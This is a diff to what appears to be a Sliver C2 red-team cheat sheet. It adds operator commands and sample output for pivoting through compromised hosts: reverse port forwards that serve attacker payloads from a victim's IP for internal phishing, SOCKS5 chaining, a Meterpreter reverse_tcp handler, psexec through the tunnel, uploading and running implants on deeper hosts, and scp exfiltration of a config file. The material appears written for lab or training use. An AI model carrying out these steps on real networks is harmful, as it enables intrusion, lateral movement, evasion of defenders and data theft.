@@ -737,25 +737,382 @@ resolve google.com
 
 ### Pivoting & Tunneling
 
+Sliver provides three primary tunneling mechanisms for pivoting through compromised hosts:
+
+| Mechanism | Direction | Use Case |
+|-----------|-----------|----------|
+| `portfwd` | Local → Remote | Forward a local port to a target through the implant |
+| `rportfwd` | Remote → Local | Forward a remote port back to your attacker machine |
+| `socks5` | Bidirectional | Full SOCKS5 proxy for dynamic routing |
+
+#### `portfwd` — Local Port Forwarding
+
+Forward a port on your operator machine through the implant to an internal target. Useful when you need to access a service on a host you can't reach directly.
+
 ```sliver
-# Port forwarding — forward a local port through the implant
-portfwd add --remote --bind 127.0.0.1:8888 --forward 192.168.1.50:80
+# Forward local port 8888 → target's internal web server
+sliver (IMPLANT) > portfwd add --bind 127.0.0.1:8888 --forward 192.168.1.50:80
 
-# List active port forwards
-portfwd
+[*] Port forwarding 127.0.0.1:8888 -> 192.168.1.50:80
+[*] Forwarder ID: 1
 
-# Remove a port forward
-portfwd remove <id>
+# Now browse the internal service from your operator machine:
+# http://127.0.0.1:8888  → routes through implant → 192.168.1.50:80
 
-# SOCKS5 proxy — create a SOCKS5 proxy through the implant
-socks5 --bind 127.0.0.1:1080
+# Forward local 2222 → target's SSH for lateral movement
+sliver (IMPLANT) > portfwd add --bind 127.0.0.1:2222 --forward 10.0.0.5:22
 
-# SSH through the implant
-ssh --user root --password <pass> 192.168.1.50
+# List active forwards
+sliver (IMPLANT) > portfwd
 
-# SSH with key
-ssh --user root --priv-key /path/to/key 192.168.1.50
+ID  Bind Address      Remote Address      Protocol   Active
+=== ================  ==================  =========  ======
+1   127.0.0.1:8888    192.168.1.50:80   TCP        true
+2   127.0.0.1:2222    10.0.0.5:22       TCP        true
+
+# Remove a forward when done
+sliver (IMPLANT) > portfwd remove 1
+
+[*] Removed port forward 1
 ```
+
+> [!tip] `portfwd` vs `portfwd add --remote`
+> `--remote` binds the forward on the implant's network interface (exposes to the implant's local subnet). Without `--remote`, it binds on your operator machine only.
+
+---
+
+#### `rportfwd` — Reverse Port Forwarding 🔥
+
+Forward a port from the **implant's host** back to a service on **your attacker machine**. This is powerful for:
+- Exposing a local exploit server to the target network
+- Bouncing connections from internal targets back to your tools
+- Setting up redirectors or catchers on the implant's interface
+
+```sliver
+# Scenario: You have a Python exploit server on your attacker machine (127.0.0.1:9090)
+# You want the compromised host (and its internal network) to reach it.
+
+# 1. Start your exploit server on the attacker machine
+(attacker) $ python3 -m http.server 9090
+
+# 2. On the implant, forward remote port 8080 → your attacker machine's 9090
+sliver (IMPLANT) > rportfwd add --bind 0.0.0.0:8080 --forward 10.10.10.10:9090
+
+[*] Reverse port forwarding 0.0.0.0:8080 -> 10.10.10.10:9090
+[*] Reverse Forwarder ID: 1
+
+# Now anyone on the implant's network can reach your exploit server:
+# http://<implant-ip>:8080  → routes through implant → 10.10.10.10:9090
+```
+
+**Real-World Example — Internal Phishing Redirect:**
+
+```sliver
+# You want to serve a payload from the compromised host's interface
+# so internal targets see a "local" IP and don't suspect external C2.
+
+# On attacker: serve payload
+(attacker) $ python3 -m http.server 8000 --directory /payloads/
+
+# On implant: expose it as port 80 on the implant's IP
+sliver (IMPLANT) > rportfwd add --bind 0.0.0.0:80 --forward 10.10.10.10:8000
+
+[*] Reverse port forwarding 0.0.0.0:80 -> 10.10.10.10:8000
+[*] Reverse Forwarder ID: 2
+
+# Internal users browsing to http://<implant-ip> see your payload server
+# The traffic looks like it's coming from an internal host
+```
+
+**Real-World Example — Bouncing Metasploit Handler:**
+
+```sliver
+# You have a Meterpreter handler on your attacker machine at 4444
+# You want implants on the target's subnet to reach it through the compromised host.
+
+# On attacker: start handler
+(attacker) $ msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.10.10; set LPORT 4444; run"
+
+# On implant: forward the handler port
+sliver (IMPLANT) > rportfwd add --bind 0.0.0.0:4444 --forward 10.10.10.10:4444
+
+[*] Reverse port forwarding 0.0.0.0:4444 -> 10.10.10.10:4444
+
+# Now your second-stage payload on the internal network calls back to
+# <implant-ip>:4444, which tunnels back to your Metasploit handler
+```
+
+```sliver
+# List reverse forwards
+sliver (IMPLANT) > rportfwd
+
+ID  Bind Address      Remote Address       Protocol   Active
+=== ================  ===================  =========  ======
+1   0.0.0.0:8080      10.10.10.10:9090   TCP        true
+2   0.0.0.0:80        10.10.10.10:8000   TCP        true
+3   0.0.0.0:4444      10.10.10.10:4444   TCP        true
+
+# Remove a reverse forward
+sliver (IMPLANT) > rportfwd remove 2
+
+[*] Removed reverse port forward 2
+```
+
+> [!warning] Binding on 0.0.0.0
+> When you bind on `0.0.0.0`, the port is exposed to the implant's entire network interface. This is usually what you want for `rportfwd`, but be aware it may trigger host-based firewalls or IDS.
+
+> [!danger] OPSEC Note
+> `rportfwd` creates listening ports on the compromised host. These may be visible to:
+> - Local `netstat` / `ss` output
+> - EDR that monitors new listening ports
+> - Network scans from defenders
+> Use short-duration forwards and clean up promptly.
+
+---
+
+#### `socks5` — Dynamic SOCKS5 Proxy
+
+The `socks5` command creates a full SOCKS5 proxy through the implant. This is the most flexible pivoting tool — route any TCP traffic dynamically through the target's network.
+
+```sliver
+# Start SOCKS5 proxy on your operator machine
+sliver (IMPLANT) > socks5 --bind 127.0.0.1:1080
+
+[*] Started SOCKS5 proxy on 127.0.0.1:1080
+[*] Proxy ID: 1
+
+# Configure your tools to use the proxy:
+# proxychains, FoxyProxy, browser settings, etc.
+```
+
+**Using with Proxychains (Linux):**
+
+```bash
+# /etc/proxychains.conf — add at bottom:
+socks5 127.0.0.1 1080
+
+# Now any tool can route through the implant's network:
+$ proxychains nmap -sT -p 22,80,443,445 192.168.1.0/24
+$ proxychains ssh user@192.168.1.100
+$ proxychains curl http://192.168.1.50:8080
+$ proxychains python3 exploit.py  # Exploit an internal target through the tunnel
+```
+
+**Using with curl / wget:**
+
+```bash
+# Direct SOCKS5 usage
+curl --socks5 127.0.0.1:1080 http://192.168.1.50:80
+wget --no-check-certificate -e use_proxy=yes -e socks_proxy=127.0.0.1:1080 http://192.168.1.50/
+```
+
+**Using with Metasploit:**
+
+```bash
+msfconsole -q
+msf6 > setg Proxies socks5:127.0.0.1:1080
+msf6 > use exploit/windows/smb/psexec
+msf6 > set RHOSTS 192.168.1.100
+msf6 > run
+# All Metasploit traffic routes through the Sliver SOCKS5 tunnel
+```
+
+**Using with Chisel (double-pivot):**
+
+```bash
+# If you need to chain through multiple implants:
+# Sliver SOCKS5 (127.0.0.1:1080) → Chisel client → Chisel server → deeper network
+
+# On attacker: chisel server
+$ chisel server -p 8080 --reverse
+
+# Through Sliver SOCKS5, connect chisel client to deeper target
+$ proxychains chisel client 127.0.0.1:8080 127.0.0.1:9090:socks
+```
+
+```sliver
+# List active SOCKS5 proxies
+sliver (IMPLANT) > socks5
+
+ID  Bind Address      Active
+=== ================  ======
+1   127.0.0.1:1080    true
+
+# Stop a SOCKS5 proxy
+sliver (IMPLANT) > socks5 stop 1
+
+[*] Stopped SOCKS5 proxy 1
+```
+
+> [!tip] SOCKS5 vs `portfwd`
+> Use `socks5` when you need **dynamic routing** to multiple targets or unknown ports. Use `portfwd` when you need **static, predictable** access to a specific service. SOCKS5 has slightly more overhead but is far more flexible.
+
+> [!warning] UDP Not Supported
+> Sliver's SOCKS5 proxy only supports TCP. UDP traffic (e.g., DNS, SNMP traps) won't route through it.
+
+---
+
+#### Multi-Hop Pivoting (Chaining Through Multiple Implants) 🔗
+
+Real networks have multiple subnets. Sliver's `pivots` command lets you chain through multiple compromised hosts to reach deeper networks.
+
+**Scenario: Three-tier network**
+```
+Attacker (10.10.10.10)
+    ↓
+Target 1 (Windows, 192.168.1.50) — DMZ
+    ↓
+Target 2 (Linux, 10.0.0.10) — Internal subnet
+    ↓
+Target 3 (Linux, 172.16.0.25) — Sensitive subnet
+```
+
+**Method 1: SOCKS5 + Proxychains (Recommended)**
+
+```sliver
+# Step 1: Get session on Target 1
+sliver > use 1
+
+# Step 2: Start SOCKS5 on Target 1
+sliver (TARGET1) > socks5 --bind 127.0.0.1:1080
+
+# Step 3: Generate implant for Target 2 that routes through Target 1's network
+sliver > generate --name target2-implant --http 192.168.1.50 --format elf
+# Note: Target 2 reaches out to 192.168.1.50 (Target 1's DMZ IP) for C2
+
+# Step 4: Upload via SOCKS5 and execute
+# In another terminal:
+$ proxychains scp ./target2-implant labuser@10.0.0.10:/tmp/
+$ proxychains ssh labuser@10.0.0.10 "chmod +x /tmp/target2-implant && /tmp/target2-implant"
+
+# Step 5: Target 2 calls back through Target 1's network
+sliver > sessions
+# [+] Session 2 TARGET2 - 10.0.0.10:51234 (LINUX-INT) - linux/amd64
+
+# Step 6: Now chain through Target 2 for deeper access
+sliver > use 2
+sliver (TARGET2) > socks5 --bind 127.0.0.1:1081
+
+# Step 7: Configure proxychains for two hops
+# /etc/proxychains.conf:
+# socks5 127.0.0.1 1080   # First hop: through Target 1
+# socks5 127.0.0.1 1081   # Second hop: through Target 2
+
+# Step 8: Reach Target 3 (deep network)
+$ proxychains nmap -sT -p 22,80,443 172.16.0.25
+$ proxychains ssh admin@172.16.0.25
+```
+
+**Method 2: Port Forward Chaining**
+
+```sliver
+# Step 1: On Target 1, forward local 2222 → Target 2's SSH
+sliver (TARGET1) > portfwd add --bind 127.0.0.1:2222 --forward 10.0.0.10:22
+
+# Step 2: SSH to Target 2 through the forward
+$ ssh -p 2222 labuser@127.0.0.1
+# (This tunnels through Target 1 → Target 2)
+
+# Step 3: On Target 2, start another forward for Target 3
+# (You'd need a second Sliver session on Target 2)
+sliver (TARGET2) > portfwd add --bind 127.0.0.1:3333 --forward 172.16.0.25:22
+
+# Step 4: Chain the forwards
+$ ssh -p 3333 admin@127.0.0.1
+# Attacker → Target 1 → Target 2 → Target 3
+```
+
+**Method 3: rportfwd for Reverse Callbacks**
+
+```sliver
+# Scenario: You need Target 3 to callback to Target 2, then to you
+
+# Step 1: On Target 2, forward its port 8443 back to your C2
+sliver (TARGET2) > rportfwd add --bind 0.0.0.0:8443 --forward 10.10.10.10:443
+
+# Step 2: Generate implant for Target 3 that calls back to Target 2
+sliver > generate --name target3-implant --https 10.0.0.10:8443 --format elf
+
+# Step 3: Upload to Target 3 via SOCKS5/proxychains
+$ proxychains scp target3-implant admin@172.16.0.25:/tmp/
+
+# Step 4: Execute on Target 3
+# Target 3 → 10.0.0.10:8443 (Target 2) → tunnels to 10.10.10.10:443 (You)
+```
+
+**Method 4: Chisel Double-Pivot (External Tool)**
+
+```bash
+# When Sliver's built-in pivoting isn't enough, chain with Chisel:
+
+# On attacker: start Chisel server
+$ chisel server -p 8080 --reverse
+
+# On Target 1 (via Sliver SOCKS5): connect Chisel client back to attacker
+$ proxychains chisel client 10.10.10.10:8080 R:9090:socks
+
+# Now you have a second SOCKS proxy on attacker:9090
+# This routes: Attacker → Target 1 → (Target 1's internal network)
+
+# For deeper pivot, repeat the process from Target 2
+```
+
+**Pivoting Chain Summary:**
+
+| Technique | Complexity | Use Case | OPSEC |
+|-----------|------------|----------|-------|
+| SOCKS5 + proxychains | Low | General recon, multiple targets | Good |
+| Port forward chain | Medium | Specific service access | Good |
+| rportfwd cascade | High | Deep callbacks, redirectors | Moderate |
+| Chisel + Sliver | High | Complex multi-hop, UDP needs | Moderate |
+
+> [!tip] Naming Convention
+> When managing multiple pivots, name your sessions clearly:
+> ```sliver
+> sliver > rename 1 dmz-webserver
+> sliver > rename 2 internal-db
+> sliver > rename 3 sensitive-dc
+> ```
+
+> [!danger] Cleanup is Critical
+> Multi-hop pivots create multiple listening ports and network paths. Always track what you've opened:
+> ```sliver
+> # Before disconnecting, audit all forwards
+> sliver > portfwd
+> sliver > rportfwd
+> sliver > socks5
+> 
+> # Remove everything
+> sliver > portfwd remove 1
+> sliver > rportfwd remove 1
+> sliver > socks5 stop 1
+> ```
+
+---
+
+#### SSH Tunneling (Bonus)
+
+Sliver also supports SSH through implants for direct interactive access:
+
+```sliver
+# SSH through the implant with password auth
+sliver (IMPLANT) > ssh --user root --password <pass> 192.168.1.50
+
+# SSH with private key
+sliver (IMPLANT) > ssh --user root --priv-key /path/to/id_rsa 192.168.1.50
+
+# This spawns an interactive SSH session through the implant's network
+```
+
+#### Pivoting Summary Table
+
+| Command | Direction | Binds On | Best For |
+|---------|-----------|----------|----------|
+| `portfwd add` | You → Target | Operator machine | Accessing specific internal services |
+| `portfwd add --remote` | You → Target | Implant machine | Exposing forward to implant's subnet |
+| `rportfwd add` | Target → You | Implant machine | Serving payloads/exploits to internal hosts |
+| `socks5` | Bidirectional | Operator machine | Dynamic multi-target routing |
+| `ssh` | Interactive | Through implant | Direct shell access to internal hosts |
 
 ### Post-Exploitation
 
@@ -1147,10 +1504,15 @@ profiles rm win-https-beacon
 
 | Command | Description | Example |
 |---------|-------------|---------|
-| `portfwd add` | Add port forward | `portfwd add --bind 127.0.0.1:8888 --forward 10.0.0.5:80` |
+| `portfwd add` | Add local port forward | `portfwd add --bind 127.0.0.1:8888 --forward 10.0.0.5:80` |
+| `portfwd add --remote` | Add remote-exposed forward | `portfwd add --remote --bind 0.0.0.0:80 --forward 10.0.0.5:80` |
 | `portfwd` | List port forwards | `portfwd` |
 | `portfwd remove` | Remove port forward | `portfwd remove 1` |
+| `rportfwd add` | Add reverse port forward | `rportfwd add --bind 0.0.0.0:8080 --forward 10.10.10.10:9090` |
+| `rportfwd` | List reverse forwards | `rportfwd` |
+| `rportfwd remove` | Remove reverse forward | `rportfwd remove 1` |
 | `socks5` | Start SOCKS5 proxy | `socks5 --bind 127.0.0.1:1080` |
+| `socks5 stop` | Stop SOCKS5 proxy | `socks5 stop 1` |
 | `ssh` | SSH through implant | `ssh --user root --password pass 10.0.0.5` |
 
 ### Implant Formats
@@ -1677,6 +2039,58 @@ sliver (SHADOW_WIN) > upload /path/to/shadow-lin /tmp/shadow-lin
 # SSH to Target 2 and execute
 ```
 
+**Bonus: Reverse Port Forwarding Scenario**
+
+```sliver
+# Scenario: You have a custom exploit server on your attacker machine (10.10.10.10:9090)
+# You want to serve it from the compromised Windows host so internal targets see a "local" IP.
+
+# 1. On attacker: start a payload server
+(attacker) $ python3 -m http.server 9090 --directory /payloads/
+
+# 2. On implant: expose it as port 80 on the Windows host
+sliver (SHADOW_WIN) > rportfwd add --bind 0.0.0.0:80 --forward 10.10.10.10:9090
+
+[*] Reverse port forwarding 0.0.0.0:80 -> 10.10.10.10:9090
+
+# Now anyone on 192.168.1.0/24 browsing to http://192.168.1.50 sees your payload server
+# The traffic appears to originate from an internal host — great for phishing/internal ops
+
+# 3. When done, clean up
+sliver (SHADOW_WIN) > rportfwd remove 1
+```
+
+**Bonus: Multi-Hop Pivoting Scenario**
+
+```sliver
+# Scenario: Target 2 is on an internal subnet (10.0.0.0/24) only reachable from Target 1.
+# Target 3 (172.16.0.25) is on a sensitive subnet behind Target 2.
+
+# Step 1: SOCKS5 through Target 1
+sliver (SHADOW_WIN) > socks5 --bind 127.0.0.1:1080
+
+# Step 2: Upload Linux implant for Target 2 via SOCKS5
+# In another terminal:
+$ proxychains scp ./shadow-lin labuser@10.0.0.10:/tmp/
+$ proxychains ssh labuser@10.0.0.10 "chmod +x /tmp/shadow-lin && /tmp/shadow-lin"
+
+# Step 3: Target 2 calls back — interact with it
+sliver > use 2
+sliver (SHADOW_LIN) > socks5 --bind 127.0.0.1:1081
+
+# Step 4: Configure proxychains for two hops
+# /etc/proxychains.conf:
+#   socks5 127.0.0.1 1080
+#   socks5 127.0.0.1 1081
+
+# Step 5: Scan and access Target 3 (deep network)
+$ proxychains nmap -sT -p 22,80,443,445 172.16.0.25
+$ proxychains ssh admin@172.16.0.25
+
+# Step 6: Exfiltrate data back through the chain
+$ proxychains scp admin@172.16.0.25:/opt/app/config.yml ./
+```
+
 #### Phase 5: Exfiltration
 
 ```sliver
@@ -1763,7 +2177,11 @@ sliver > creds
 ├─────────────────────────────────────────────────────────────┤
 │ Pivoting                                                    │
 │  socks5 --bind 127.0.0.1:1080                              │
+│  socks5 stop <id>                                       │
 │  portfwd add --bind L:P --forward R:P                      │
+│  portfwd add --remote --bind 0.0.0.0:P --forward R:P      │
+│  rportfwd add --bind 0.0.0.0:P --forward ATTACKER:P      │
+│  rportfwd remove <id>                                   │
 │  ssh --user U --password P <host>                          │
 ├─────────────────────────────────────────────────────────────┤
 │ OPSEC                                                       │
